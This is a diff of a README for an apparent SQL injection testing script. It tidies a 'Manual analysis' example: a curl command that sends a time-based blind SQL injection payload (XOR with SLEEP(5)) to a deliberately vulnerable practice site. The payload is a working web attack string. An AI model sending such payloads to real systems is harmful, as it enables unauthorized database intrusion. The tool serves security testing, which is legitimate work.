@@ -41,7 +41,7 @@ python3 SQLi_Sleeps2.py -u urls.txt -d data.txt
 Manual analysis
 
 ```sh
-time curl "http://testphp.vulnweb.com/search.php?test=query'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z" -I <br>
+time curl "http://testphp.vulnweb.com/search.php?test=query'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z" -I
 ```
 
 <img width="890" height="241" alt="image" src="https://github.com/user-attachments/assets/ec7a995a-9965-481d-8361-a7e84cb8e282" /><br>
